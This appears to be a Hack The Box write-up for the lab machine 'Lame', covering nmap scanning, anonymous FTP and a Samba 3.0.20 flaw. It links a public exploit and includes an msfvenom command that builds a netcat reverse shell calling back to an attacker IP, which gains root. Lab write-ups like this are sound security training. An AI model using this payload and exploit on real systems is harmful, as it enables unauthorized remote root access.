title: Lame - Hack The Box
excerpt: Lame is an easy linux machine that will not require privilege escalation because as soon you get into the system you are already root user, this will be done by taking advantage of a vulnerability on the smbd samba 3.0.20 service.

**Machine IP = 10.10.10.3**

As always we start with init hack with is gonna well us determine which machine are we attacking as well as it is going to create the environment in which we are going to work.

![](/assets/images/Beginner-Track/pic1.png)

We can see that according we will be working against a **linux machine**. Now after doing some basic steps, We start by sending some nmaps commands to start checking the network:

  * nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.10.3


```

## Enumeration

I usually start by checking the port which I'm more comfortable and in this case it would be *ftp* (port 21).The nmap scan shows that ftp allows Anonymous login, but when we check the service we don't find anything interesting.

![](/assets/images/Beginner-Track/pic2.png)

the next thing that drives my attention is port 445 is running a **Samba 3.0.20** so I use searchsploit to see if there is any vulnerability on that exact  version.


![](/assets/images/Beginner-Track/pic3.png)


We can see that there are some possible exploits for *samba 3.0.20* but none of the search work for us because we are not going to use metasploit on this machine. We do the same search on google and we find a exploit that works on :

  * [https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py](https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py)

## Gaining Foothold

The only thing that we need to change in this exploit is the payload with the command that is showing on the exploit. On my case the command was :

  *  msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.4 LPORT=443 -f python

Run the exploit and we are in as **root**
